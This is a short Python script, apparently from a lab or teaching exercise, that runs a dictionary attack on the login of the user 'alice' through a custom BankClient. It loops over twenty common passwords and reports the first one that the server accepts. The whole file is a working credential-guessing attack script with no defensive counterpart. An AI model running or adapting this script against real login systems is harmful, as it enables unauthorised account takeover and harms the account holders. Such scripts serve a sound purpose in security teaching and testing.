# attack_bruteforce.py
import time
from bank_client import BankClient

LOGIN = "alice"
WORDLIST = [
    "123456", "password", "admin", "admin123", "root",
    "qwerty", "qwerty123", "12345", "12345678", "letmein",
    "alice", "alice123", "alice2024", "1q2w3e4r", "111111",
    "master", "dragon", "monkey", "iloveyou", "sunshine",
]

t0 = time.time()
for i, pwd in enumerate(WORDLIST, 1):
    c = BankClient()
    resp = c.cmd(f"LOGIN {LOGIN} {pwd}")
    ok = resp.startswith("OK|")
    print(f"[{i:2}] {pwd:12} -> {resp}")
    c.close()
    if ok:
        print(f"\n[+] PASSWORD FOUND: {pwd!r} in {time.time() - t0:.2f} sec")
        break
else:
    print("\n[-] Password not found in the dictionary")
